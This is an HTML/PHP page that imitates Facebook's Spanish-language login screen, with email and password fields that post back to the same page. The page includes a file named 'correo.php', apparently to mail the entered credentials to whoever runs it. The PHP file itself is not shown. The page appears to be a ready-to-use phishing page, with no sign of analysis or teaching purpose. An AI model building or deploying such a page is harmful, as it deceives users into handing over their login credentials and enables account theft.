<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Facebook - Log In or Sign Up</title>
</head>

<body>
    <div class="container">
        <div class="container-profile">
            <span class="logo">
                <img src="img/1.svg" alt="facebook">
            </span>
            <p class="connect-friends">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</p>
        </div>
        <div class="container-form">
            <form class="form" method="post">
                <input type="text" placeholder="Correo electronico o numero de telefono" name="email">
                <input type="password" placeholder="Contraseña" name="pass">
                <input type="submit" value="Iniciar Sesión" name="enviar">
                <span><a href="#">¿Has olvidado tu contraseña?</a></span>
                <div class="border"></div>
                <button><a href="#">Crear cuenta nueva</a></button>
            </form>
            <?php
            include("correo.php");
            ?>
            <p class="create-page">
                <a href="#">Crea una página</a> para un famoso, una marca o una empresa.
            </p>
        </div>
    </div>
</body>
</html>